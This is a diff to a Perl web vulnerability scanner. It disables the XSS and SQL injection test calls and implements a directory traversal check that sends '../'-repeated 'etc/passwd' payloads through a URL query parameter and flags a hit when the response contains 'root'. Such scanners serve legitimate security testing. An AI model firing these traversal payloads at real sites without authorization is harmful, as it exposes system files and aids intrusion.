@@ -37,8 +37,8 @@ sub work {
     }
     elsif ($form) { 
         $point_id = _insert_point_of_interest( $website_id, $form ); 
-        _try_xss_attacks( $point_id, $url, $form, $mech );
-        _try_sql_injection_attacks( $point_id, $url, $form, $mech );
+        #_try_xss_attacks( $point_id, $url, $form, $mech );
+        #_try_sql_injection_attacks( $point_id, $url, $form, $mech );
     }
     
     $job->completed();
@@ -155,12 +155,29 @@ sub _try_sql_injection_attacks {
 sub _try_dir_traversal_attack {
     my ($point_id, $url, $uri, $mech) = @_;
     
-    print STDERR Dumper $uri;
+    my ($param, $value) = $uri->query_form;
+    
+    print STDERR "\$param == $param - \$value == $value \n";
     
     my $request;
     for(1..15) {
-        $request = '../'*$1 . 'etc/passwd';
+        $request = '../'x$_ . 'etc/passwd';
         print STDERR $request . "\n";
+        
+        $uri->query_form( $param => $request );
+        
+        print STDERR $uri->as_string . "\n";
+        
+        eval { $mech->get( $uri->as_string ) };
+        
+        if ( $mech->success() ) {
+            print STDERR "page request successful \n";
+            if ( $mech->content() =~ m/root/gi ) {
+                print STDERR "--- Directory Traversal Vulnerability Found ---\n";
+                _insert_vulnerability( $point_id, 'Directory Traversal', $uri->as_string );
+                last;
+            }
+        }   
     }
 }
 
